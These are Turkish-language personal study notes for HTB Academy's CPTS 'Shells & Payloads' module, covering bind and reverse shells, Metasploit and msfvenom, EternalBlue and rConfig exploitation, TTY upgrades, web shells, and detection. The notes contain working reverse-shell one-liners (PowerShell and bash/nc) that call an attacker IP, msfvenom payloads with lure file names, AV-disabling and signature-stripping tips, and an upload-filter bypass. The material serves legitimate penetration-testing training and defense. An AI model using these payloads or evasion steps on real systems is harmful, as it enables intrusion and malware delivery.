[← Tüm modüller](../README.md)

# 08 — Shells & Payloads

HTB CPTS path'inin sekizinci modülü için tuttuğum çalışma notları. Konu: **shell elde etme** — bind/reverse shell anatomisi, payload mantığı (staged vs stageless), Metasploit + MSFvenom ile payload üretimi, Windows ve Linux infiltrasyonu (EternalBlue, rConfig RCE), interaktif shell spawn (TTY upgrade), web shell'ler (Laudanum/Antak/PHP) ve detection/prevention.

> **Not stratejisi:** Bu modül komut + kavram karışımı. 02-Getting Started'daki shell temelleriyle örtüşen kısımları (basit nc reverse shell) kısa tuttum; ağırlığı **payload üretimi (msfvenom), Metasploit workflow, TTY upgrade yöntem zenginliği ve web shell'ler**e verdim. Shell takıldığında ("non-tty shell'im var, python yok") dönüp bakılacak referans.

Notlar Türkçe, teknik terimler İngilizce bırakıldı.

---

## İçindekiler

1. [Shell Anatomisi — Terminal / Interpreter](#1-shell-anatomisi--terminal--interpreter)
2. [Bind vs Reverse Shell](#2-bind-vs-reverse-shell)
3. [Payload — One-Liner Anatomisi](#3-payload--one-liner-anatomisi)
4. [Metasploit Workflow](#4-metasploit-workflow)
5. [MSFvenom — Payload Üretimi](#5-msfvenom--payload-üretimi)
6. [Staged vs Stageless](#6-staged-vs-stageless)
7. [Infiltrating Windows](#7-infiltrating-windows)
8. [Infiltrating Linux](#8-infiltrating-linux)
9. [Interactive Shell Spawn — TTY Upgrade](#9-interactive-shell-spawn--tty-upgrade)
10. [Web Shells — Laudanum / Antak / PHP](#10-web-shells--laudanum--antak--php)
11. [Detection & Prevention](#11-detection--prevention)
12. [Tek Bakışta Özet](#12-tek-bakışta-özet)

---

## 1. Shell Anatomisi — Terminal / Interpreter

Shell etkileşimi 3 parçadan oluşur: **OS + terminal emulator + command language interpreter**.
- **Terminal emulator:** uygulama (Windows Terminal, PuTTY, GNOME Terminal, iTerm2...). Tek bir dile bağlı değil.
- **Command language interpreter (shell dili):** Bash, PowerShell, Ksh, POSIX... `$` = Bash/Ksh/POSIX prompt işareti.

Hedefte hangi interpreter var?
```bash
ps            # çalışan process'lerde bash/powershell görünür
env           # SHELL=/bin/bash
```
> MITRE ATT&CK'te "Command and Scripting Interpreter" = Execution tekniği. Hedefin dilini bilmek = hangi payload/komut çalışır bilmek.

---

## 2. Bind vs Reverse Shell

| | Bind Shell | Reverse Shell |
|---|---|---|
| Listener | **TARGET**'ta | **ATTACKER**'da |
| Bağlantıyı başlatan | ATTACKER (target'a bağlanır) | TARGET (attacker'a bağlanır) |
| Firewall | **inbound** izin gerekir (zor) | **outbound** (kolay, admin gözden kaçırır) |
| Tespit | Daha kolay yakalanır | Daha gizli |

### Bind shell (nc)
```bash
# TARGET: shell'i socket'e bağla (payload)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ip> 7777 > /tmp/f
# ATTACKER: bağlan
nc -nv <target_ip> 7777
```

### Reverse shell (PowerShell, Windows)
```bash
# ATTACKER: listener (443 = HTTPS, outbound bloklanmaz)
sudo nc -lvnp 443
```
```cmd
:: TARGET: PowerShell reverse one-liner (cmd içinden)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
> **AV engeli:** Windows Defender bu kodu "malicious content" diye bloklar. Lab'da test için: `Set-MpPreference -DisableRealtimeMonitoring $true` (admin PS). Gerçekte → encode/obfuscate gerekir.
> **Port seçimi:** 443/80 gibi common portlar outbound'da nadiren bloklanır. Ama L7/deep packet inspection yapan firewall common portta bile reverse shell'i içeriğe bakarak yakalayabilir.

**Hazır payload kaynağı:** PayloadsAllTheThings, Reverse Shell Cheat Sheet. (Dikkat: admin'ler de bu repo'ları bilir, imzalamış olabilir → bazen custom gerekir.)

---

## 3. Payload — One-Liner Anatomisi

Payload = zafiyeti exploit eden komut/kod. "Malware" romantize edilmiş hali — aslında sadece hedefe talimat.

**Bash/nc reverse one-liner parçalanması:**
```bash
rm -f /tmp/f;          # varsa named pipe'ı sil (; = sıralı çalıştır)
mkfifo /tmp/f;          # FIFO named pipe oluştur
cat /tmp/f |            # pipe'ın stdout'unu sonraki komutun stdin'ine bağla
/bin/bash -i 2>&1 |     # interaktif bash, stderr(2)+stdout(1) redirect
nc 10.10.14.12 7777 > /tmp/f   # attacker'a bağlan, output'u pipe'a geri yaz
```

**PowerShell one-liner mantığı:** `powershell -nop -c "..."` (no-profile, command). `New-Object System.Net.Sockets.TCPClient` → socket; `GetStream` → iletişim; `while` loop içinde `Invoke-Expression (iex)` ile gelen komutu çalıştır, çıktıyı geri gönder. Nishang'daki `Invoke-PowerShellTcp` bunun script (.ps1) versiyonu (`-Reverse`/`-Bind` switch'li).

> Payload'ın ne yaptığını anlamak = AV neden blokluyor anlamak = neyi değiştirip bypass edeceğini bilmek.

---

## 4. Metasploit Workflow

Rapid7'nin otomatik exploit framework'ü. Pre-built modüller + options.

```bash
sudo msfconsole        # başlat (exploit/payload sayıları banner'da)

search smb             # modül ara (nmap enum'una göre vektör seç)
use 56                 # veya: use exploit/windows/smb/psexec
options / show options # ayarları gör (Required=yes olanlar şart)

set RHOSTS 10.129.180.71    # hedef
set LHOST 10.10.14.222      # kendi IP (tun0)
set LPORT 4444
set SMBUser htb-student     # cred (psexec için)
set SMBPass 'HTB_@cademy_stdnt!'
set SHARE ADMIN$

exploit    (veya run)       # → meterpreter session
```

**Modül adı anatomisi** (`exploit/windows/smb/psexec`):
```
exploit/   → modül tipi (exploit/auxiliary/post)
windows/   → platform
smb/       → servis/attack vector
psexec     → kullanılan araç/teknik
```

**Meterpreter:** default payload (`windows/meterpreter/reverse_tcp`). In-memory DLL injection ile gizli kanal. Raw TCP shell'den çok daha güçlü: file up/download, keylogger, process yönetimi, post-exploit modülleri.
```
meterpreter > getuid      # kim olduğunu gör
meterpreter > shell       # native OS shell'e düş (cmd.exe / /bin/sh)
meterpreter > ?           # komut listesi
```

**Harici exploit import:** MSF'te yoksa Rapid7 GitHub'dan `.rb` dosyasını `/usr/share/metasploit-framework/modules/exploits/<platform>/<service>/` altına koy → `use` ile çağır. `apt update; apt install metasploit-framework` ile güncel tut.

---

## 5. MSFvenom — Payload Üretimi

Network erişimi olmayan senaryolarda (social engineering, email, USB) standalone payload dosyası üret. Encode/encrypt ile AV bypass da sağlar.

```bash
msfvenom -l payloads                # tüm payload'ları listele

# Linux stageless reverse shell (.elf)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

# Windows stageless reverse shell (.exe)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
| Flag | Anlamı |
|---|---|
| `-p` | payload seç |
| `LHOST`/`LPORT` | callback adresi |
| `-f` | format (elf/exe/raw/py/php...) |
| `-e` | encoder (AV bypass) |
| `>` | çıktı dosyası (inconspicuous isim ver) |

**Çalıştırma:** dosyayı hedefe ulaştır (email/download/USB/exploit modülü) → ATTACKER `sudo nc -lvnp 443` ile bekle → hedef dosyayı çalıştırınca shell gelir.
> Encode'suz payload AV'ye yakalanır. İsim önemli: `BonusCompensationPlanpdf.exe` gibi tıklanası.

---

## 6. Staged vs Stageless

| | Staged | Stageless |
|---|---|---|
| Yapı | Küçük stage gönderilir → callback → kalan payload indirilir | Tüm payload tek seferde |
| Memory | Daha az (stage yer kaplar) | Daha fazla |
| Bandwidth | Düşük bandwidth'te **unstable** | Düşük bandwidth/latency'de iyi |
| Evasion | — | Daha az network trafiği → bazen daha iyi evasion |
| İsim | `/` ile ayrık: `linux/x86/shell/reverse_tcp` | Birleşik: `linux/zarch/meterpreter_reverse_tcp` |

> **İsimden ayırt et:** `windows/meterpreter/reverse_tcp` = staged (ayrık `/`). `windows/meterpreter_reverse_tcp` = stageless (birleşik). Emin değilsen description'da "staged/stageless" yazar.

---

## 7. Infiltrating Windows

### Fingerprinting (Windows mi?)
```bash
ping <ip>                  # TTL ~128 = Windows (Linux ~64)
sudo nmap -v -O <ip>       # OS detection → "cpe:/o:microsoft:windows_10"
sudo nmap -v <ip> --script banner.nse   # servis banner
```
Tipik Windows açık portlar: 135 (msrpc), 139 (netbios), 445 (smb), 3389 (rdp).

### Windows payload dosya tipleri
| Tip | Kullanım |
|---|---|
| **DLL** | shared library — malicious DLL injection → SYSTEM / UAC bypass |
| **Batch (.bat)** | DOS script — port aç, callback, enum |
| **VBS** | VBScript — phishing (Office macro tetikleme) |
| **MSI** | Windows Installer — `msiexec` ile çalıştır → elevated shell |
| **PowerShell (.ps1)** | .NET tabanlı, en esnek |

### Prominent Windows exploit'leri
| Exploit | Açıklama |
|---|---|
| **MS08-067** | SMB flaw (Conficker, Stuxnet kullandı) |
| **EternalBlue (MS17-010)** | SMBv1 RCE (WannaCry/NotPetya); 2008→2016 etkiler |
| **PrintNightmare** | Print Spooler RCE → SYSTEM |
| **BlueKeep (CVE-2019-0708)** | RDP RCE (Win2000→2008R2) |
| **SigRed (CVE-2020-1350)** | DNS SIG record → Domain Admin (DNS = DC genelde) |
| **SeriousSam (CVE-2021-36934)** | SAM dosyası izin hatası → cred dump |
| **Zerologon (CVE-2020-1472)** | Netlogon crypto flaw → ~256 denemede DC |

### Örnek: EternalBlue ile SYSTEM shell
```bash
# 1. Enum
nmap -v -A 10.129.201.97          # → Windows Server 2016, SMB açık
# 2. Zafiyet teyidi
msf6 > use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.129.201.97 ; run     # → "likely VULNERABLE to MS17-010"
# 3. Exploit (psexec versiyonu daha stabil)
msf6 > use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.129.201.97 ; set LHOST 10.10.14.12
exploit                            # → meterpreter (NT AUTHORITY\SYSTEM)
meterpreter > getuid               # Server username: NT AUTHORITY\SYSTEM
meterpreter > shell                # C:\Windows\system32>
```

### CMD vs PowerShell
| Kullan: CMD | Kullan: PowerShell |
|---|---|
| Eski host (XP öncesi, PS yok — PS Win7'den geldi) | cmdlet/custom script lazımsa |
| Basit etkileşim | .NET object'leriyle çalışma |
| Batch/net/MS-DOS native araçlar | Cloud servis etkileşimi |
| **Stealth** (CMD komut geçmişi tutmaz!) | Stealth önemsizse (PS history tutar) |

> **WSL & PowerShell Core blind spot:** WSL network trafiği Windows Firewall/Defender'dan geçmez → AV/EDR bypass vektörü.

---

## 8. Infiltrating Linux

W3Techs: web server'ların %70+'ı Unix tabanlı → shell + pivot fırsatı.

**Değerlendirilecekler:** hangi distro? hangi shell/dil var? sistem ne iş yapıyor? hangi app host'luyor? bilinen CVE?

### Örnek: rConfig 3.9.6 RCE
```bash
# 1. Enum → web server (Apache/PHP, CentOS), rConfig 3.9.6 login page
nmap -sC -sV 10.129.201.101
# 2. Versiyon → CVE/exploit ara ("rConfig 3.9.6 exploit metasploit github")
# 3. MSF modülü (yoksa GitHub'dan .rb indir → modules/exploits/linux/http/)
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
# ayarla → exploit → meterpreter (apache user olarak)
#   exploit: version check → auth → PHP payload upload → trigger → delete → shell
meterpreter > shell
python -c 'import pty; pty.spawn("/bin/sh")'   # non-tty → tty upgrade
```
> Payload apache user ile çalışır → non-tty shell (su/sudo çalışmaz). Python ile TTY upgrade gerekir.

---

## 9. Interactive Shell Spawn — TTY Upgrade

> Modülün en pratik kısmı. Non-tty (jail) shell'de `su`/`sudo`/text-editor çalışmaz. Hangi dil/araç varsa onunla interactive shell spawn et.

```bash
# Python (en yaygın) — önce: which python
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# /bin/sh interactive
/bin/sh -i

# Perl
perl -e 'exec "/bin/sh";'

# Ruby
ruby -e 'exec "/bin/sh"'

# Lua
lua -e 'os.execute("/bin/sh")'

# AWK (çoğu Unix'te var)
awk 'BEGIN {system("/bin/sh")}'

# Find (-exec ile)
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit

# VIM
vim -c ':!/bin/sh'
#  veya vim içinde: :set shell=/bin/sh  →  :shell
```

**Permission kontrolü (shell alınca ilk işler):**
```bash
ls -la <path>      # dosya/binary izinleri
sudo -l            # bu user hangi komutları sudo ile çalıştırabilir
#  (ALL : ALL) NOPASSWD: ALL  →  priv-esc jackpot
#  Not: sudo -l stabil interactive shell gerektirir
```
> `/bin/sh` / `/bin/bash` yerine sistemde ne varsa onu kullan. GTFOBins bu spawn tekniklerinin genişletilmiş hali.

---

## 10. Web Shells — Laudanum / Antak / PHP

Upload zafiyeti varsa web shell → browser'dan komut. Diller: asp, aspx, jsp, php.

### Laudanum (çok dilli, Kali/Parrot'ta built-in)
```bash
ls /usr/share/laudanum/        # asp, aspx, jsp, php...
cp /usr/share/laudanum/aspx/shell.aspx ~/demo.aspx
# → dosyayı düzenle: allowedIps'e kendi IP'ni ekle (satır 59)
# → ASCII art + comment'leri sil (imza/AV riski)
# → upload et → navigate et → komut çalıştır
```

### Antak (ASPX, Nishang projesi — PowerShell temalı)
```bash
ls /usr/share/nishang/Antak-WebShell/    # antak.aspx
cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/Upload.aspx
# → satır 14'e user+password ekle (web shell'e erişim koruması)
# → comment'leri sil → upload → navigate → login → PowerShell komutları
```
PowerShell console gibi; her komutu yeni process olarak çalıştırır, in-memory script + encode destekler. Windows server için ideal.

### PHP Web Shell (WhiteWinterWolf) + file-type bypass
```
# rConfig Vendor Logo upload → sadece image kabul ediyor
# → Burp Suite (127.0.0.1:8080 proxy) ile POST request'i yakala
# → Content-Type: application/x-php  →  image/gif olarak değiştir
# → Forward → bypass → /images/vendor/connect.php → web shell
```

**Web shell dikkat edilecekler:**
- App dosyaları belli süre sonra otomatik silebilir
- Sınırlı interaktivite (komut zincirleme `&&` çalışmayabilir, dosya gezinme zor)
- Non-interactive → instabilite
- **İz bırakma riski yüksek** → ideal: web shell ile reverse shell al, sonra payload'ı sil
- Her denemeyi dokümante et (dosya adı, upload yeri, md5/sha1 hash → rapor attribution)

---

## 11. Detection & Prevention

### MITRE ATT&CK (Shells & Payloads ile ilişkili)
| Taktik | Açıklama |
|---|---|
| **Initial Access** | Public-facing host/servis compromise (web app, SMB misconfig) → foothold |
| **Execution** | Attacker kodunu hedefte çalıştırma (bu modülün ana odağı) |
| **Command & Control (C2)** | Kalıcı/interaktif erişim; common port/protokol (HTTP/S, DNS, Slack/Discord/Teams), clear-text (nc) → encrypted/obfuscated |

### İzlenecek event'ler
- **File uploads** — web app log'ları (shell upload en yaygın vektör)
- **Suspicious non-admin actions** — normal user `whoami`/bash/cmd çalıştırıyorsa, end-host→end-host SMB
- **Anomalous network sessions** — NetFlow: top talkers, nonstandard port heartbeat (**4444 = Meterpreter default**), bulk GET/POST

### Savunma
- **Network visibility:** topology diagram, L7 görünürlük (Meraki/Palo Alto/Check Point), baseline → sapma görünür. **Deep packet inspection** = network AV (clear-text nc trafiğini yakalar)
- **End device:** AV enabled (Defender), firewall tüm profiller açık, patch management
- **Mitigation'lar:** application sandboxing, least privilege, host segmentation/hardening (STIG, DMZ), firewall (inbound/outbound rule + NAT shell'leri kırar)
- **Defense-in-depth** yaklaşımı

> Bir payload başarılı olsa bile **network üzerinden iletişim kurmak zorunda** → network visibility kritik. nc gibi clear-text shell'ler packet capture'da her komutu ele verir.

---

## 12. Tek Bakışta Özet

| Konu | Özü |
|---|---|
| Bind vs Reverse | Bind: target dinler (inbound, zor). Reverse: attacker dinler (outbound, kolay+gizli) |
| Payload | Zafiyeti exploit eden komut/kod; ne yaptığını anla → AV bypass'ı anla |
| Metasploit | search → use → set options → exploit → meterpreter > shell |
| Meterpreter | In-memory DLL injection; getuid, shell, file transfer, post-exploit |
| MSFvenom | `-p <payload> LHOST= LPORT= -f <format> > file`; network'süz delivery |
| Staged/Stageless | İsimde ayrık `/` = staged; birleşik = stageless |
| Windows exploit | EternalBlue (MS17-010), PrintNightmare, Zerologon, BlueKeep... |
| TTY upgrade | `python -c 'import pty;pty.spawn("/bin/bash")'` + perl/ruby/awk/find/vim alternatifleri |
| Shell alınca | `sudo -l`, `ls -la` → priv-esc vektörü |
| Web shell | Laudanum (çok dilli), Antak (ASPX/PS), PHP + Burp Content-Type bypass |
| Detection | 4444 port, clear-text nc, file upload, anomalous NetFlow, MITRE Execution |
| CMD vs PS | CMD = stealth (history yok), eski host; PS = güçlü, cloud, ama history tutar |

---

## Kaynaklar

- **HTB Academy** — Shells & Payloads (CPTS path, Module 08)
- **Framework'ler:** Metasploit (msfconsole, msfvenom, Meterpreter), Mythic C2, Nishang, Darkarmour
- **Web shell'ler:** Laudanum (/usr/share/laudanum), Antak (Nishang), WhiteWinterWolf PHP shell
- **Araçlar:** Netcat/Ncat, Nmap (-O, banner.nse, smb_ms17_010), Impacket, Burp Suite, PayloadsAllTheThings, Reverse Shell Cheat Sheet
- **Windows CVE'ler:** MS08-067, MS17-010 (EternalBlue), PrintNightmare, BlueKeep, SigRed, SeriousSam, Zerologon
- **Referans:** MITRE ATT&CK, ippsec.rocks (video walkthrough arama)

Notlar kişisel çalışma amacıyla tutuldu ve halka açık paylaşıldı.
Hata veya eksik gördüğünüz yerler için issue açabilirsiniz.

[← Tüm modüller](../README.md)
